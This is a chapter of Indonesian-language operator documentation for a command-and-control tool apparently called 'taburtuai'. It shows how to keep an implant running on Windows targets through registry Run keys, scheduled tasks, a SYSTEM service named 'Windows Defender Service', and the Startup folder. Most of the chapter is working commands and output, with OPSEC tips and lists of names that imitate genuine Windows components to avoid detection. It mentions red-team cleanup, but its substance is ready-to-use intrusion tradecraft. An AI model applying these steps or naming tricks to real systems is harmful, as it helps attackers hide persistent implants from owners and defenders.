# 07 — Persistence

## Konsep Persistence

Persistence adalah teknik untuk memastikan agent tetap berjalan setelah:
- Mesin target direboot
- User logout/login
- Proses agent di-kill (jika persistence spawn ulang agent)

**Prinsip OPSEC Persistence:**
1. Gunakan nama yang menyatu dengan sistem (bukan "backdoor123")
2. Pilih metode yang sesuai dengan privilege yang dimiliki (user vs SYSTEM)
3. Selalu bersihkan setelah engagement selesai

---

## Cek Privilege Sebelum Memilih Metode

```
taburtuai(IP:8000) › cmd 2703886d "whoami /priv"
```

Cari privilege berikut untuk menentukan metode yang tersedia:

| Privilege | Metode yang Bisa Dipakai |
|-----------|--------------------------|
| User biasa | `registry_run`, `startup_folder` |
| `SeBackupPrivilege` | + `registry_run_hklm` |
| Administrator lokal | Semua metode |
| SYSTEM / Domain Admin | Semua metode termasuk service |

---

## Method 1: Registry Run Key

Menambahkan entry di Registry Run Key — agent dijalankan setiap kali user login.

### HKCU (User Privilege — Tidak Butuh Admin)

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method registry_run \
  --name "WindowsSecurityUpdate" \
  --wait
```

**Output:**
```
[*] Installing registry_run persistence...
[*] Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] Name: WindowsSecurityUpdate
[*] Path: C:\Users\john.doe\AppData\Roaming\WindowsSecurityUpdate.exe
[+] Persistence installed successfully.
[i] Agent akan restart otomatis setelah logon berikutnya.
[i] Hapus dengan: persistence remove 2703886d --method registry_run --name "WindowsSecurityUpdate"
```

**Verifikasi:**
```
taburtuai(IP:8000) › cmd 2703886d \
  'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"' \
  --method cmd
```
```
[+] Result:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    WindowsSecurityUpdate    REG_SZ    C:\Users\john.doe\AppData\Roaming\WindowsSecurityUpdate.exe
```

### HKLM (Butuh Admin — Aktif untuk Semua User)

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method registry_run_hklm \
  --name "MicrosoftEdgeUpdate" \
  --wait
```

**Output:**
```
[*] Installing HKLM registry_run persistence (requires admin)...
[*] Key : HKLM\Software\Microsoft\Windows\CurrentVersion\Run
[*] Name: MicrosoftEdgeUpdate
[+] Persistence installed successfully.
[i] Agent berjalan untuk SEMUA user yang login ke mesin ini.
```

---

## Method 2: Scheduled Task

Lebih powerful dari registry run — bisa trigger di event tertentu, hidden, dan bisa
jalankan sebagai SYSTEM.

### Trigger: Logon

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method schtask \
  --name "OneDriveSync" \
  --trigger logon \
  --wait
```

**Output:**
```
[*] Creating scheduled task...
[*] Task name: OneDriveSync
[*] Trigger  : At logon
[*] Action   : C:\Users\john.doe\AppData\Local\Temp\OneDriveSync.exe
[*] Run as   : DESKTOP-QLPBF95\john.doe
[+] Scheduled task created successfully.
```

**Verifikasi:**
```
taburtuai(IP:8000) › cmd 2703886d "schtasks /query /fo LIST /tn OneDriveSync" --method cmd
```
```
[+] Result:

TaskName:                             \OneDriveSync
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        4/23/2026 8:44:00 AM
Last Result:                          0
Author:                               DESKTOP-QLPBF95\john.doe
Task To Run:                          C:\Users\john.doe\AppData\Local\Temp\OneDriveSync.exe
Run As User:                          DESKTOP-QLPBF95\john.doe
Scheduled Task State:                 Enabled
Trigger: At log on of any user        Enabled
```

### Trigger: Boot (Butuh Admin)

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method schtask \
  --name "WindowsUpdateService" \
  --trigger boot \
  --wait
```

**Output:**
```
[*] Creating scheduled task (boot trigger — requires admin)...
[*] Trigger: At system startup
[*] Run as : SYSTEM
[+] Scheduled task created. Runs at system boot as SYSTEM.
```

### Trigger: Interval (Setiap N Menit)

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method schtask \
  --name "SystemHealthCheck" \
  --trigger interval \
  --interval 15 \
  --wait
```

**Output:**
```
[*] Task will repeat every 15 minutes.
[+] Scheduled task created.
```

---

## Method 3: Windows Service (Butuh Admin/SYSTEM)

Paling persistent — berjalan sebagai SYSTEM, restart otomatis jika crash, dimulai
sebelum user login.

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method service \
  --name "WinDefSvc" \
  --display-name "Windows Defender Service" \
  --wait
```

**Output:**
```
[*] Installing Windows service (requires admin)...
[*] Service name  : WinDefSvc
[*] Display name  : Windows Defender Service
[*] Binary path   : C:\Windows\System32\WinDefSvc.exe
[*] Start type    : Automatic
[*] Run as        : SYSTEM
[+] Service created and started successfully.

SERVICE_NAME: WinDefSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
        WIN32_EXIT_CODE    : 0  (0x0)
        START_TYPE         : 2   AUTO_START
```

**Verifikasi:**
```
taburtuai(IP:8000) › cmd 2703886d "sc query WinDefSvc"
```
```
[+] Result:

SERVICE_NAME: WinDefSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

---

## Method 4: Startup Folder

Letakkan shortcut (.lnk) di folder Startup — agent berjalan saat user login.
Tidak butuh admin.

```
taburtuai(IP:8000) › persistence setup 2703886d \
  --method startup_folder \
  --name "SystemTray" \
  --wait
```

**Output:**
```
[*] Creating startup folder shortcut...
[*] Path: C:\Users\john.doe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemTray.lnk
[*] Target: C:\Users\john.doe\AppData\Roaming\SystemTray.exe
[+] Startup shortcut created.
```

---

## List Persistence yang Terpasang

```
taburtuai(IP:8000) › persistence list 2703886d
```

**Output:**
```
[+] Installed persistence for agent 2703886d:

METHOD          NAME                    DETAILS
registry_run    WindowsSecurityUpdate   HKCU\...\Run
schtask         OneDriveSync            trigger=logon
service         WinDefSvc               AUTO_START, SYSTEM
startup_folder  SystemTray              Startup folder
```

---

## Hapus Persistence

```
taburtuai(IP:8000) › persistence remove 2703886d \
  --method registry_run \
  --name "WindowsSecurityUpdate" \
  --wait
```

**Output:**
```
[*] Removing registry_run persistence 'WindowsSecurityUpdate'...
[+] Registry key deleted.
[i] Agent tidak akan lagi di-restart setelah logon.
```

```
taburtuai(IP:8000) › persistence remove 2703886d --method schtask --name "OneDriveSync" --wait
# [+] Scheduled task 'OneDriveSync' deleted.

taburtuai(IP:8000) › persistence remove 2703886d --method service --name "WinDefSvc" --wait
# [*] Stopping service...
# [+] Service 'WinDefSvc' stopped and deleted.

taburtuai(IP:8000) › persistence remove 2703886d --method startup_folder --name "SystemTray" --wait
# [+] Startup shortcut deleted.
```

---

## Perbandingan Metode

| Method | Privilege | Trigger | Visibility | OPSEC |
|--------|-----------|---------|------------|-------|
| Registry Run (HKCU) | User | Login user | Registry → mudah ditemukan | Sedang |
| Registry Run (HKLM) | Admin | Login semua user | Registry | Sedang |
| Scheduled Task (logon) | User | Login user | Task Scheduler | Sedang |
| Scheduled Task (boot) | Admin | Boot OS | Task Scheduler | Sedang |
| Windows Service | Admin/SYSTEM | Boot OS | Services.msc | Tinggi |
| Startup Folder | User | Login user | Startup folder | Rendah |

---

## Rekomendasi Nama yang Legitimate

Pilih nama yang berbaur dengan proses Windows asli:

**Registry Run Key:**
- `MicrosoftEdgeUpdate`
- `OneDriveSyncManager`
- `WindowsDefenderNotify`
- `SecurityHealthSystray`

**Scheduled Task:**
- `OneDriveReportingTask`
- `MicrosoftOfficeSync`
- `WindowsUpdateCleanup`

**Service:**
- `WinHTTPAutoProxySvc`
- `SecurityHealthService`
- `DiagTrack`

---

**Selanjutnya:** [08 — Process Management](08-process.md)
